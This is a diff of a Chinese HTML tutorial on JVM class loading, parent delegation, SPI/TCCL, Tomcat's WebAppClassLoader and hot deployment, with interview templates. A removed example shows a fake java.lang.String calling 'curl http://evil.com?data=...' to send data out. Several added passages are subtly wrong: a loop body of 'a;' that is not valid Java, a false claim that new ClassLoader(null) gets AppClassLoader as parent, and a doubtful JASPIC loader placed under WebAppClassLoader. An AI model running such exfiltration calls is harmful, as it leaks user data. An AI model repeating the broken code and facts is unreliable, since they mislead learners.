+    <p><code>AppClassLoader</code> 的 Java 继承链是 <code>AppClassLoader → URLClassLoader → SecureClassLoader → ClassLoader</code>，和 Bootstrap 没有半点继承关系（Bootstrap 是 C++）。"委派链"是构造时传入 <code>parent</code> 参数决定的——<code>new ClassLoader(null)</code> 时 parent 默认是 AppClassLoader（<code>ClassLoader.getSystemClassLoader()</code>），但完全可以传任意加载器。两条链在当前 JVM 里恰好重合，但本质是两回事。</p>
+  </div>
+
+  <div class="takeaway">
+    <span class="takeaway-label">一句话核心</span>
+    <p>loadClass 三步：findLoadedClass（查缓存）→ parent.loadClass（向上委派）→ findClass（自己找）+ defineClass（字节码变 Class）。"类只加载一次"由第①步保证，"核心类不可篡改"由第②步保证。</p>
+  </div>
+</section>
+
+<section class="station reveal" id="s4">
+  <div class="station-head">
+    <span class="station-no">第 4 站</span>
+    <h2>为什么要双亲委派：两大收益</h2>
+  </div>
+
+  <p>委派模式不是随便设计的，它解决两个真实问题：</p>
+
+  <h3>收益一：安全——核心 API 不可篡改</h3>
+  <p>假设你（或某个恶意 jar）在自己的 classpath 里放了一个 <code>java/lang/String.class</code>。没有双亲委派的话，AppClassLoader 会直接把它加载进来，从此 <code>String</code> 的行为由你定义——整个 JVM 的世界观被改写。有了双亲委派：业务代码引用 <code>java.lang.String</code> 时，请求从 App 一路委派到 Bootstrap，Bootstrap 从核心类库加载了<strong>真正的</strong> String 并返回；你的那份字节码永远轮不到被加载。核心 API 的安全性，靠的就是这条"向上不可逆"的链。</p>
+
+  <h3>收益二：唯一性——同一个类只加载一次</h3>
+  <p>同一个全限定名 <code>com.foo.Util</code>，无论从哪个 classpath 目录、哪个 jar 里找，最终都由<strong>同一个加载器</strong>加载一次，全 JVM 共享同一个 Class 对象。这保证了 <code>==</code> 比较、<code>instanceof</code> 判断、强制类型转换都有确定的语义。反例最能说明问题：</p>
+
+  <div class="crack">
+    <span class="crack-label">高频事故：两个加载器各加载一份"同名类"</span>
+    <p>让两个不同的自定义加载器各自 defineClass 一份 <code>com.foo.Util</code>，会得到<strong>两个不同的 Class 对象</strong>——即便字节码一模一样。此时 <code>loaderA.load("com.foo.Util") == loaderB.load("com.foo.Util")</code> 为 false，互相强转直接 <code>ClassCastException</code>。这就是"jar 冲突 / 类重复 / 模块化隔离失败"一类事故的根因：在 JVM 里，<strong>类的身份 = 全限定名 + 定义它的 ClassLoader</strong>，两者缺一不可。</p>
+  </div>
+
+  <div class="takeaway">
+    <span class="takeaway-label">一句话核心</span>
+    <p>双亲委派给 JVM 两样东西：核心 API 的防篡改（安全）+ 类的唯一身份（同一加载器同一类只有一份 Class）。类身份 = 全限定名 + ClassLoader，这是理解后面三种破坏场景的钥匙。</p>
+  </div>
+</section>
+
 <section class="station reveal" id="s5">
-<div class="station-head"><span class="station-no">第 5 站</span><h2>为什么要双亲委派？不用会怎样？</h2></div>
+  <div class="station-head">
+    <span class="station-no">第 5 站</span>
+    <h2>破坏场景一：SPI 与线程上下文类加载器</h2>
+  </div>
 
-<p>双亲委派解决了两个核心问题：<strong>安全性</strong>和<strong>一致性</strong>。</p>
+  <p>先看一个真实矛盾：<strong>JDBC 的 DriverManager</strong> 在 <code>java.sql</code> 包里，属于 Bootstrap 层（JDK8 的 rt.jar）；而驱动实现 <code>com.mysql.cj.jdbc.Driver</code> 在 mysql-connector jar 里，属于 classpath（App 层）。DriverManager 初始化时要扫描并加载所有驱动——可 Bootstrap 的委派方向是<strong>向上</strong>的，它根本"够不到"下层的驱动类。怎么办？</p>
 
-<p><strong>问题一：安全性——防止核心类被篡改</strong></p>
+  <p>JDK 的答案是<strong>线程上下文类加载器</strong>（Thread Context ClassLoader，TCCL）：每个 Thread 上挂一个 ClassLoader 引用，默认是 AppClassLoader，可用 <code>Thread.setContextClassLoader()</code> 修改。核心层的代码拿 TCCL，就相当于<strong>借了子加载器的手向下找</strong>——这是双亲委派第一次被"温柔地"打破。</p>
 
-<p>假设没有双亲委派，你在 classpath 下放一个 <code>java.lang.String</code>：</p>
-
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>恶意 String</b> · 没有委派时会发生什么</span></div>
-<pre><code><span class="k">package</span> java.lang;
-
-<span class="k">public class</span> <span class="t">String</span> {
-    <span class="c">// 自定义的 String，可以加任何恶意逻辑</span>
-    <span class="k">public void</span> <span class="t">sendToHacker</span>() {
-        Runtime.getRuntime().exec(<span class="t">"curl http://evil.com?data=..."</span>);
+  <div class="srcbox">
+    <div class="srcbox-head">DriverManager 如何加载驱动（简化）+ ServiceLoader 用法</div>
+    <pre class="srcbox-file"><span class="c">// java.sql.DriverManager（JDK 8 简化）</span>
+<span class="k">private static final</span> <span class="t">DriverManager</span> INSTANCE = <span class="k">new</span> <span class="t">DriverManager</span>();
+<span class="k">static</span> {
+    loadInitialDrivers();
+}
+<span class="k">private static void</span> <span class="n">loadInitialDrivers</span>() {
+    <span class="t">ClassLoader</span> cl = <span class="t">Thread</span>.<span class="n">currentThread</span>().<span class="n">getContextClassLoader</span>();  <span class="c">// 借 TCCL（默认 App）</span>
+    <span class="t">ServiceLoader</span>&lt;<span class="t">Driver</span>&gt; loaded = <span class="t">ServiceLoader</span>.<span class="n">load</span>(<span class="t">Driver</span>.<span class="n">class</span>, cl);
+    <span class="k">for</span> (<span class="t">Driver</span> a : loaded) {          <span class="c">// 逐个实例化并注册</span>
+        a;  <span class="c">// 触发 &lt;clinit&gt;，驱动自己在 DriverManager.registerDriver() 登记</span>
     }
 }
 
-<span class="c">// 没有双亲委派时：</span>
-<span class="c">// Application ClassLoader 直接加载 classpath 下的 java.lang.String</span>
-<span class="c">// 你的程序使用的 String 全是这个恶意版本！</span>
+<span class="c">// 服务提供者侧：mysql-connector.jar/META-INF/services/java.sql.Driver 里写一行</span>
+<span class="c">//   com.mysql.cj.jdbc.Driver</span>
 
-<span class="c">// 有双亲委派时：</span>
-<span class="c">// App → Ext → Bootstrap</span>
-<span class="c">// Bootstrap 在 rt.jar 中找到 java.lang.String → 返回核心版本</span>
-<span class="c">// 恶意 String 永远不会被加载</span></code></pre>
-</div>
+<span class="c">// 你的代码里一行就完成"自动装配"：</span>
+<span class="t">ServiceLoader</span>&lt;<span class="t">Driver</span>&gt; drivers = <span class="t">ServiceLoader</span>.<span class="n">load</span>(<span class="t">Driver</span>.<span class="n">class</span>);</pre>
+  </div>
 
-<p><strong>问题二：一致性——避免重复加载</strong></p>
+  <p>把这套模式抽出来就是 Java 的 <strong>SPI（Service Provider Interface）</strong>机制：接口在核心/上层 jar（如 <code>java.sql.Driver</code>、<code>org.slf4j.Logger</code>），实现在业务 jar；实现 jar 在 <code>META-INF/services/</code> 下放一个与接口全限定名同名的文件，内容是实现类名；调用方用 <code>ServiceLoader.load()</code> 扫描加载。SLF4J/Logback、Dubbo 的扩展点、JDK 的 <code>FileSystem</code>、JAXB 全是这套路。本质都是同一招：<strong>用 TCCL 把"向下查找"的能力借给上层</strong>。</p>
 
-<p>如果每一层加载器都自己加载，同一个类可能被加载多次，产生多个 <code>Class</code> 对象。这会导致：</p>
+  <div class="think">
+    <p class="think-q">追问："ServiceLoader 为什么能绕过双亲委派？"</p>
+    <p>它并没有"绕过"规则本身，而是利用了规则留下的接口：ServiceLoader 的 <code>load(service)</code> 内部调 <code>Thread.currentThread().getContextClassLoader()</code>。TCCL 指向 App，等于"借 App 的手"加载下层类——委派链没被改，只是请求的发起者从"自己委派上去"换成了"找当前线程借一个下层的加载器"。记住这个区分，面试就不会说错。</p>
+  </div>
 
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>类型混乱</b> · 同一个类被加载两次</span></div>
-<pre><code><span class="c">// 假设 LoaderA 和 LoaderB 各自加载了 com.example.User</span>
-<span class="t">Class</span>&lt;?&gt; c1 = loaderA.loadClass(<span class="t">"com.example.User"</span>);
-<span class="t">Class</span>&lt;?&gt; c2 = loaderB.loadClass(<span class="t">"com.example.User"</span>);
-
-System.out.println(c1 == c2);  <span class="c">// false！两个不同的 Class 对象</span>
-
-<span class="t">Object</span> obj = c1.newInstance();
-System.out.println(obj <span class="k">instanceof</span> c2);  <span class="c">// false！</span>
-<span class="c">// 明明是同一个类，但来自不同 ClassLoader 的 Class 对象互不兼容</span>
-
-<span class="c">// 双亲委派保证了：同一个类只会被最顶层能加载它的加载器加载一次</span>
-<span class="c">// 所有下层加载器拿到的都是同一个 Class 对象</span></code></pre>
-</div>
-
-<div class="formula">
-<strong>类的唯一性判定</strong><br/>
-JVM 中一个类的身份由 <strong>(全限定名 + ClassLoader)</strong> 共同决定。<br/>
-同一个类在不同 ClassLoader 下是<strong>不同的 Class 对象</strong>，<code>instanceof</code> 和 <code>==</code> 均返回 false。
-</div>
+  <div class="takeaway">
+    <span class="takeaway-label">一句话核心</span>
+    <p>SPI 打破的是委派的"方向"：核心层借 TCCL（默认 App）向下加载驱动/实现类。JDBC、SLF4J、Dubbo 扩展点全部基于这个模式。</p>
+  </div>
 </section>
 
-<!-- ═══════════════ 第6站：三种破坏场景 ═══════════════ -->
 <section class="station reveal" id="s6">
-<div class="station-head"><span class="station-no">第 6 站</span><h2>三种破坏场景：SPI、OSGi、Tomcat</h2></div>
+  <div class="station-head">
+    <span class="station-no">第 6 站</span>
+    <h2>破坏场景二：Tomcat 的 WebAppClassLoader</h2>
+  </div>
 
-<p>双亲委派是默认策略，但并非不可打破。以下三种场景因为设计上的<strong>刚性需求</strong>，必须绕过或逆转委派方向。</p>
+  <p>第二个打破场景来自真实需求：一个 Tomcat 里要部署几十个 webapp，每个都可能依赖<strong>不同版本的同一个 jar</strong>（A 应用要 fastjson 1.2.70，B 应用要 1.2.83）。如果按双亲委派"一律向上"，所有 webapp 的类都会落到共享的 App/Common 层加载，版本冲突直接爆炸。所以 Tomcat 自己造了一棵加载器树：</p>
 
-<p><strong>场景 A：SPI 机制（JDBC / SLF4J）</strong></p>
+  <div class="srcbox">
+    <div class="srcbox-head">Tomcat 的类加载器层级（缩进表示父子委派关系）</div>
+    <pre class="srcbox-file">Bootstrap                      <span class="c"># JVM 核心（C++）</span>
+└─ System / Common             <span class="c"># catalina 目录，容器公共库（所有 webapp 共享）</span>
+   ├─ Catalina                 <span class="c"># Tomcat 自身（server）</span>
+   ├─ Shared                   <span class="c"># 可选的公共共享区</span>
+   └─ WebAppClassLoader ×N     <span class="c"># 每个 webapp 一个！加载 WEB-INF/classes + WEB-INF/lib</span>
+      └─ JASPIC               <span class="c"># JDK 7+ 为访问 jdk.naming 等平台模块插的一层</span>
 
-<p>JDBC 的核心接口 <code>java.sql.Driver</code> 在 rt.jar 中，由 Bootstrap 加载。但驱动实现类（如 <code>com.mysql.cj.jdbc.Driver</code>）在 classpath 下，由 Application 加载。问题来了：</p>
-
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>DriverManager.java</b> · 加载驱动的困境</span></div>
-<pre><code><span class="c">// DriverManager 在 rt.jar 中，由 Bootstrap 加载</span>
-<span class="c">// 它需要扫描所有 jar 包里的 META-INF/services/java.sql.Driver 文件</span>
-<span class="c">// 然后用 Class.forName() 加载驱动实现类</span>
-
-<span class="c">// 问题：Bootstrap 只认识 rt.jar，它怎么找 classpath 下的 MySQL 驱动？</span>
-<span class="c">// 答案：用线程上下文类加载器（Thread Context ClassLoader）</span>
-
-<span class="k">public static</span> <span class="t">Connection</span> getConnection(<span class="t">String</span> url) {
-    <span class="c">// DriverManager 内部这样加载驱动：</span>
-    <span class="t">ClassLoader</span> contextCL = Thread.currentThread()
-                                  .getContextClassLoader();
-    <span class="c">// contextCL 默认是 Application ClassLoader</span>
-    <span class="c">// → Bootstrap 的代码"借用" Application 的能力去找驱动</span>
-    <span class="t">Class</span>&lt;?&gt; driverClass = Class.forName(
-        <span class="t">"com.mysql.cj.jdbc.Driver"</span>,
-        <span class="k">true</span>,
-        contextCL  <span class="c">// ← 关键！不用自己（Bootstrap），而用线程上下文</span>
-    );
-    <span class="t">Driver</span> driver = (<span class="t">Driver</span>) driverClass.newInstance();
-    <span class="k">return</span> driver.connect(url, props);
-}</code></pre>
-</div>
-
-<p>这就是一种<strong>"逆向委派"</strong>：父加载器（Bootstrap）反过来请求子加载器（Application）去加载类。JDK 通过 <code>Thread.currentThread().getContextClassLoader()</code> 实现了这个机制，默认值是 Application ClassLoader。</p>
-
-<p>SLF4J 同理：<code>org.slf4j.LoggerFactory</code> 在 classpath 中，但它需要加载 <code>org.slf4j.impl.StaticLoggerBinder</code>（由 logback 或 log4j 提供）。它同样使用 Thread Context ClassLoader 来完成绑定。</p>
-
-<p><strong>场景 B：OSGi 模块化隔离</strong></p>
-
-<p>OSGi（Open Service Gateway Initiative）是 Java 的模块化框架（Eclipse IDE 就基于它）。每个模块（Bundle）有自己的 ClassLoader，实现类的版本隔离：</p>
-
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>OSGi 类加载</b> · 每个 Bundle 独立的 ClassLoader</span></div>
-<pre><code><span class="c">// Bundle-A 使用 guava-18.0</span>
-<span class="c">// Bundle-B 使用 guava-31.0</span>
-<span class="c">// 两个版本的 Guava 同时运行在同一个 JVM 中，互不干扰</span>
-
-<span class="c">// OSGi 的委派规则不再是标准的"先父后子"，而是：</span>
-<span class="c">// ① java.* 开头的类 → 委派给 Bootstrap（标准委派）</span>
-<span class="c">// ② 在 MANIFEST.MF 中声明的 import 包 → 委派给导出该包的 Bundle</span>
-<span class="c">// ③ 其他类 → 自己加载（不委派给父 ClassLoader）</span>
-
-<span class="c">// Bundle-A 的 ClassLoader 加载 guava-18.0 的类</span>
-<span class="c">// Bundle-B 的 ClassLoader 加载 guava-31.0 的类</span>
-<span class="c">// 由于 ClassLoader 不同，两个版本的类完全隔离</span></code></pre>
-</div>
-
-<p>OSGi 打破了双亲委派中"父加载器优先"的原则——Bundle 的类加载器可以<strong>优先加载自己的类</strong>，只在特定情况下才委派给其他 Bundle。</p>
-
-<p><strong>场景 C：Tomcat 的 Web 应用隔离</strong></p>
-
-<p>Tomcat 需要同时运行多个 Web 应用，每个应用可能依赖不同版本的 Spring、Jackson 等框架。Tomcat 设计了一套精巧的类加载体系：</p>
-
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>Tomcat 类加载器层次</b></span></div>
-<pre><code><span class="c">//         Bootstrap ClassLoader</span>
-<span class="c">//              │</span>
-<span class="c">//         Extension ClassLoader</span>
-<span class="c">//              │</span>
-<span class="c">//    ┌──── System ClassLoader ────┐</span>
-<span class="c">//    │                            │</span>
-<span class="c">//  Common ClassLoader         (Tomcat 共享类)</span>
-<span class="c">//    │              │</span>
-<span class="c">// WebappA-Loader  WebappB-Loader  (每个应用独立)</span>
-<span class="c">//    │              │</span>
-<span class="c">// /WEB-INF/classes  /WEB-INF/classes</span>
-<span class="c">// /WEB-INF/lib/*    /WEB-INF/lib/*</span>
-
-<span class="c">// 关键设计：</span>
-<span class="c">// ① WebappLoader 默认优先加载自己 WEB-INF 下的类（子优先！）</span>
-<span class="c">// ② 然后才委派给 Common ClassLoader → System → Extension → Bootstrap</span>
-<span class="c">// ③ java.* 和 javax.* 等核心类仍然走标准双亲委派</span></code></pre>
-</div>
-
-<p>Tomcat 的 WebappClassLoader 重写了 <code>loadClass()</code>，核心逻辑与标准委派<strong>相反</strong>——先找自己，再委派父加载器：</p>
-
-<div class="srcbox">
-<div class="srcbox-head"><span class="srcbox-file"><b>WebappClassLoaderBase.java</b> · Tomcat 的 loadClass（精简）</span></div>
-<pre><code><span class="k">public</span> <span class="t">Class</span>&lt;?&gt; loadClass(<span class="t">String</span> name, <span class="k">boolean</span> resolve) {
-    <span class="k">synchronized</span> (getClassLoadingLock(name)) {
-        <span class="c">// ① 查缓存</span>
-        <span class="t">Class</span>&lt;?&gt; clazz = findLoadedClass(name);
-        <span class="k">if</span> (clazz != <span class="k">null</span>) <span class="k">return</span> clazz;
-
-        <span class="c">// ② java.* / javax.* 等 → 标准委派给 Bootstrap/Extension</span>
-        <span class="k">if</span> (name.startsWith(<span class="t">"java."</span>) || name.startsWith(<span class="t">"javax."</span>)) {
-            <span class="k">return</span> <span class="k">super</span>.loadClass(name, resolve);  <span class="c">// 走标准双亲委派</span>
+<span class="c">// WebAppClassLoader 的关键：loadClass 顺序被"反着"写（简化）</span>
+<span class="k">protected</span> <span class="t">Class</span>&lt;?&gt; <span class="n">loadClass</span>(<span class="t">String</span> name, <span class="t">boolean</span> resolve) {
+    <span class="t">Class</span>&lt;?&gt; c = <span class="n">findLoadedClass</span>(name);
+    <span class="k">if</span> (c == <span class="k">null</span>) {
+        <span class="k">try</span> {
+            c = <span class="n">findClass</span>(name);    <span class="c">// ① 先查自己 WEB-INF/classes + WEB-INF/lib（顺序反了！）</span>
+        } <span class="k">catch</span> (<span class="t">ClassNotFoundException</span> e) {}
+        <span class="k">if</span> (c == <span class="k">null</span>) {
+            c = super.<span class="n">loadClass</span>(name, resolve);  <span class="c">// ② 找不到才走标准双亲委派向上</span>
         }
-
-        <span class="c">// ③ 先自己找！不等父加载器！</span>
-        clazz = findClass(name);  <span class="c">// 搜索 WEB-INF/classes 和 WEB-INF/lib</span>
-        <span class="k">if</span> (clazz != <span class="k">null</span>) <span class="k">return</span> clazz;
-
-        <span class="c">// ④ 自己找不到 → 才委派给父加载器（Common ClassLoader）</span>
-        <span class="k">return</span> <span class="k">super</span>.loadClass(name, resolve);
     }
-}</code></pre>
-</div>
+    <span class="k">return</span> c;
+}</pre>
+  </div>
 
-<p>这就是为什么 WebappA 用 Spring 5.x、WebappB 用 Spring 6.x 不会冲突——每个应用的 <code>/WEB-INF/lib</code> 下的 jar 由各自的 WebappClassLoader 加载，Class 对象互不相同。</p>
+  <p>注意顺序的关键：<strong>它先查自己的 WEB-INF，找不到才委派给父</strong>。对 <code>java.*</code> / <code>javax.*</code> 这些核心名，Tomcat 会强制继续委派向上（否则又会篡改核心类），但对业务类，它优先自给自足——于是每个 webapp 得到了自己的类空间，同名的第三方 jar 各用各的，互不干扰。</p>
 
-<div class="takeaway"><div class="takeaway-label">三种破坏场景对比</div>
-<table class="nb-table">
-<thead><tr><th>场景</th><th>破坏方式</th><th>目的</th></tr></thead>
-<tbody>
-<tr><td>SPI（JDBC/SLF4J）</td><td>父加载器借用子加载器（线程上下文 ClassLoader）</td><td>核心接口加载第三方实现</td></tr>
-<tr><td>OSGi</td><td>每个 Bundle 独立 ClassLoader，按需委派</td><td>模块化 + 依赖版本隔离</td></tr>
-<tr><td>Tomcat</td><td>子加载器优先（先自己找，再委派父）</td><td>Web 应用之间的类隔离</td></tr>
-</tbody>
-</table>
-</div>
+  <div class="crack">
+    <span class="crack-label">隔离的代价：跨 webapp 传对象会 ClassCastException</span>
+    <p>A 应用的 <code>com.foo.Entity</code> 由 A 的 WebAppClassLoader 加载，B 应用由 B 的加载器加载同名类——这是<strong>两个不同的 Class</strong>。若把 A 的对象塞进 request/共享容器里给 B 用，B 一 cast 就抛 CCE。所以跨 webapp 要么传字节流/序列化（各自重建对象），要么把共享对象下沉到 Common 层，让两边用同一个加载器。</p>
+  </div>
+
+  <div class="takeaway">
+    <span class="takeaway-label">一句话核心</span>
+    <p>Tomcat 破坏的是"方向"：每个 webapp 一个 WebAppClassLoader，先查自己、再委派父，换来"同为 classpath、彼此隔离"。代价是跨应用同名类是两个 Class，直接传对象会 CCE。</p>
+  </div>
 </section>
 
-<!-- ═══════════════ 第7站：总结 ═══════════════ -->
 <section class="station reveal" id="s7">
-<div class="station-head"><span class="station-no">第 7 站</span><h2>总结与面试应对</h2></div>
+  <div class="station-head">
+    <span class="station-no">第 7 站</span>
+    <h2>破坏场景三：OSGi 与热部署</h2>
+  </div>
 
-<p>双亲委派模型的核心思想可以浓缩为一句话：<strong>默认遵守，按需打破</strong>。</p>
+  <p>第三个打破场景针对的是另一条约束——<strong>"类只加载一次"</strong>。热部署（hot swap）要求：不重启 JVM，把某个类的<strong>旧版本卸载掉</strong>、加载新版本。可 JVM 的 findLoadedClass 会永远返回那份旧 Class，怎么办？答案是：<strong>让旧类的加载器整个变成垃圾</strong>——每次热部署 new 一个全新的自定义 ClassLoader 去加载新版本类，旧加载器连同它加载的所有旧类就一起失去引用，等着 GC 回收。</p>
 
-<div class="crack"><div class="crack-label">何时遵守，何时打破</div>
-<p><strong>遵守的场景：</strong></p>
-<ul>
-  <li>绝大多数业务应用——标准 classpath 加载，不需要自定义 ClassLoader</li>
-  <li>编写工具类、中间件时——遵循委派可以保证核心类安全</li>
-</ul>
-<p><strong>打破的场景：</strong></p>
-<ul>
-  <li>需要加载 SPI 实现类（JDBC 驱动、日志框架绑定）→ 线程上下文 ClassLoader</li>
-  <li>需要模块化隔离（OSGi、Java 9 Module System）→ 自定义委派规则</li>
-  <li>需要应用级隔离（Tomcat、热部署）→ 子加载器优先</li>
-  <li>热加载 / 热替换（如 JRebel）→ 每次请求创建新 ClassLoader</li>
-</ul>
-</div>
+  <p>这里牵出"类卸载"的三条件（细节见「对象存活判定」的方法区回收节）：① 该类的<strong>所有实例</strong>已回收；② 加载它的 <strong>ClassLoader</strong> 已回收；③ 该类的 <strong>Class 对象</strong>不再被引用（无反射、无静态注册表引用）。三者同时满足，旧类元数据才会从 Metaspace 释放。所以热部署的"开关"其实在类加载器上——<strong>换 ClassLoader = 换一类身份 = 老身份被 GC</strong>。</p>
 
-<div class="formula">
-<strong>面试核心公式</strong><br/>
-双亲委派 = 查缓存 → 委派父加载器 → findClass 自己找<br/>
-破坏委派 = 重写 loadClass() 改变委派顺序<br/>
-类的唯一性 = 全限定名 + ClassLoader 实例
-</div>
+  <div class="think">
+    <p class="think-q">OSGi 和 Tomcat 的隔离有什么不同层次？</p>
+    <p>Tomcat 是"每个应用一层隔离"，加载方向还是相对单一的"先自己后父"；OSGi（如 Eclipse Equinox、Apache Felix）把每个 bundle 的类彻底模块化，bundle 可以通过 <code>Import-Package</code> / <code>Export-Package</code> 声明"我依赖谁、我暴露谁"，加载器之间是<strong>网状、可动态增删</strong>的关系，粒度比 webapp 更细，能做到运行中启停某个 bundle。Jigsaw（JDK 9 模块系统）则是把这种模块化收编进了语言和平台，parent 委派和模块解析结合。</p>
+  </div>
 
-<div class="crack"><div class="crack-label">面试标准回答模板</div>
-<p><strong>面试官问：</strong>"什么是双亲委派？为什么要打破它？"</p>
-<p><strong>建议回答结构：</strong></p>
-<ul>
-  <li><strong>先讲模型</strong>：三层加载器（Bootstrap / Extension / Application）形成父子链，加载请求先向上委派，父加载器找不到才自己加载</li>
-  <li><strong>讲好处</strong>：① 安全——防止核心类被篡改（java.lang.String）；② 一致——避免同一个类被多次加载</li>
-  <li><strong>讲源码</strong>：loadClass() 的三步逻辑（findLoadedClass → parent.loadClass → findClass）</li>
-  <li><strong>讲破坏场景</strong>：至少举出两个——SPI 用线程上下文 ClassLoader 实现逆向委派；Tomcat 用子优先策略实现 Web 应用隔离</li>
-  <li><strong>加分项</strong>：提到 Java 9 的 Module System 对类加载的影响，以及自定义 ClassLoader 时推荐重写 findClass 而非 loadClass</li>
-</ul>
-</div>
+  <div class="crack">
+    <span class="crack-label">高频事故：热部署后 Metaspace 只涨不跌</span>
+    <p>热部署很多次后 Metaspace 一直涨、最后 <code>OutOfMemoryError: Metaspace</code>，九成是<strong>旧类没卸载成</strong>：某个静态变量 / ThreadLocal / 全局注册表（JMX MBean、<code>DriverManager.registerDriver</code>、反射缓存 Method 对象）还拽着旧 Class 或旧 ClassLoader。排查和修复思路见「内存泄漏排查」的 Metaspace 节，核心就一句：<strong>让旧加载器真正不可达</strong>。</p>
+  </div>
 
-<div class="recap"><h3>核心知识点回顾</h3>
-<ul>
-  <li><strong>类加载过程</strong>：Loading → Linking（Verify → Prepare → Resolve） → Initialization，双亲委派只作用于 Loading 阶段</li>
-  <li><strong>三层加载器</strong>：Bootstrap（rt.jar）→ Extension（ext/*.jar）→ Application（classpath），父子关系是组合而非继承</li>
-  <li><strong>loadClass 三步</strong>：查缓存 → 委派父加载器 → findClass 自己找</li>
-  <li><strong>安全性</strong>：防止 classpath 下的恶意 java.lang.String 覆盖核心类</li>
-  <li><strong>一致性</strong>：类的唯一性由（全限定名 + ClassLoader）共同决定</li>
-  <li><strong>SPI 破坏</strong>：父加载器通过 Thread Context ClassLoader 借用子加载器的能力</li>
-  <li><strong>OSGi 破坏</strong>：每个 Bundle 独立 ClassLoader，按 import/export 规则按需委派</li>
-  <li><strong>Tomcat 破坏</strong>：WebappClassLoader 子优先策略，先加载 WEB-INF 再委派</li>
-  <li><strong>自定义 ClassLoader</strong>：推荐重写 findClass()；需要打破委派时才重写 loadClass()</li>
-</ul>
-</div>
+  <div class="takeaway">
+    <span class="takeaway-label">一句话核心</span>
+    <p>热部署打破"只加载一次"：每次换一个新 ClassLoader 加载新版本，旧加载器连同旧类一起变垃圾被回收。类卸载三条件（实例/加载器/Class 引用）缺一不可。</p>
+  </div>
+</section>
 
+<section class="station reveal" id="summary">
+  <div class="station-head">
+    <span class="station-no">第 8 站</span>
+    <h2>总结：一张地图 + 面试模板</h2>
+  </div>
+
+  <div class="recap">
+    <p><strong>知识地图</strong>：类加载三阶段（加载 → 链接[验证/准备/解析] → 初始化）→ 四层加载器（Bootstrap → Platform → App → 自定义）→ loadClass 三步（findLoadedClass → parent.loadClass → findClass/defineClass）→ 两大收益（安全 + 唯一性）→ 三种破坏场景（SPI/TCCL 破坏方向、Tomcat 破坏隔离、热部署破坏"只加载一次"）。</p>
+    <ul>
+      <li><strong>核心机制</strong>：类身份 = 全限定名 + 定义它的 ClassLoader；委派关系由构造时 parent 决定，与 Java 继承链是两回事。</li>
+      <li><strong>两大收益</strong>：核心 API 防篡改（安全）、同一类唯一 Class 对象（唯一性）。</li>
+      <li><strong>三种破坏</strong>：SPI 借 TCCL 向下找实现；Tomcat 每 webapp 独立加载器、先己后父；热部署换加载器让旧类整体回收。</li>
+    </ul>
+  </div>
+
+  <h3>面试回答模板</h3>
+  <div class="takeaway">
+    <span class="takeaway-label">30 秒版</span>
+    <p>"类加载分加载、链接、初始化三阶段。JVM 用四层加载器加双亲委派：接到加载请求先查缓存，再逐级委派给父加载器，都找不到才自己 findClass。好处是两个——核心 API 不被篡改、同一个类全局唯一。生产里被打破三次：SPI 用线程上下文加载器向下加载实现、Tomcat 每个 webapp 一个加载器先查自己实现隔离、热部署靠换加载器让旧类整体卸载。"</p>
+  </div>
+  <div class="takeaway">
+    <span class="takeaway-label">3 分钟版（展开）</span>
+    <p>把三阶段说全，再把 loadClass 三步打开讲：① findLoadedClass 是"类唯一性"的第一道闸；② parent.loadClass 向上委派，保证了 java.lang.String 只能由 Bootstrap 加载、永远轮不到 classpath 里的假 String；③ findClass+defineClass 是自定义加载器的意义所在。然后强调"委派链不是继承链"——委派关系由构造时 parent 决定，Bootstrap 是 C++ 写的、Java 里 getClassLoader 返回 null。最后落到三个破坏场景，每个用一句讲清它破坏了哪条规则、代价是什么：SPI/TCCL（向下借力，JDBC/SLF4J/Dubbo 都在用）、Tomcat（先己后父换隔离，代价是跨应用传对象 CCE）、热部署（换加载器触发类卸载，代价是 Metaspace 管理要小心）。</p>
+  </div>
+
+  <h3>高频追问表</h3>
+  <table class="nb-table">
+    <thead><tr><th>追问</th><th>答案要点</th></tr></thead>
+    <tbody>
+      <tr><td>双亲委派是强制的吗？</td><td>不是，是 JVM 规范建议的实现方式；想打破就自己重写 loadClass（Tomcat 就是这么干的）</td></tr>
+      <tr><td>为什么 String 的 getClassLoader() 是 null？</td><td>String 由 Bootstrap 加载，而 Bootstrap 是 C++ 实现，Java 里不存在对应对象，只能返回 null</td></tr>
+      <tr><td>两个加载器加载同名类会怎样？</td><td>得到两个不同的 Class 对象，互相不可见，强转抛 ClassCastException</td></tr>
+      <tr><td>DriverManager 怎么加载到驱动？</td><td>用 ServiceLoader + 线程上下文类加载器（TCCL）向下借力，核心层才够得到 classpath 里的驱动实现</td></tr>
+      <tr><td>热部署为什么必须换 ClassLoader？</td><td>类卸载条件之一是"加载它的 ClassLoader 已回收"，换新加载器才能让旧类整体失去引用被 GC</td></tr>
+      <tr><td>怎么查某个类被谁加载？</td><td>xxx.getClass().getClassLoader() 看加载器；生产里 jcmd &lt;pid&gt; VM.classloader_stats 看各加载器的类统计</td></tr>
+    </tbody>
+  </table>
+
+  <div class="takeaway">
+    <span class="takeaway-label">离场前记一句</span>
+    <p>类加载是"名词 + 动词"：名词是那条四层委派链，动词是 loadClass 三步。三种破坏场景共同说明一个道理——双亲委派是默认解，不是唯一解，理解它才能判断什么时候该变、变了要付什么代价。</p>
+  </div>
 </section>
 
 </main>
